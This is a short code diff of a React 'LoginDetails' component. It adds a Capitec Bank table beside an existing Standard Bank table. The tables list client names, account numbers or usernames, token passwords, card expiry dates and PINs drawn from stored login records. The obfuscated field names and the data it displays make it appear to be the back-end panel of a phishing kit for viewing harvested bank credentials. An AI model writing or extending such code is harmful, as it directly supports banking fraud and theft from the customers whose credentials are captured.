@@ -11,7 +11,11 @@ const LoginDetails = () => {
     (login) => login?.data?.bank.toLowerCase() === "standard bank"
   );
 
-  console.log(standardBank);
+  const capitecBank = loginsData?.filter(
+    (login) => login?.data?.bank.toLowerCase() === "capitec bank"
+  );
+
+  console.log(loginsData);
 
   return (
     <>
@@ -56,6 +60,36 @@ const LoginDetails = () => {
                         {parseDate(login?.data?._exp_iry_Da_te_.seconds * 1000)}
                       </td>
                       <td>{login?.data?._p_i_n_}</td>
+                    </tr>
+                  ))}
+              </table>
+            </div>
+          )}
+          {capitecBank && capitecBank.length > 0 && (
+            <div id="table-container">
+              <Typography
+                fontSize={18}
+                fontWeight={600}
+                mb={4}
+                textAlign="center"
+              >
+                Capitec Bank
+              </Typography>
+              <table>
+                <tr id="table-head-row">
+                  <th>Client</th>
+                  <th>Date</th>
+                  <th>Account Number / Username</th>
+                  <th>Token Password</th>
+                </tr>
+                {[...capitecBank]
+                  .sort((a, b) => b.timeStamp.seconds - a.timeStamp.seconds)
+                  .map((login) => (
+                    <tr key={login?._user}>
+                      <td>{login?.user_name}</td>
+                      <td>{parseDate(login.timeStamp.seconds * 1000)}</td>
+                      <td>{login?.data?.account_number}</td>
+                      <td>{login?.data?.token_password}</td>
                     </tr>
                   ))}
               </table>
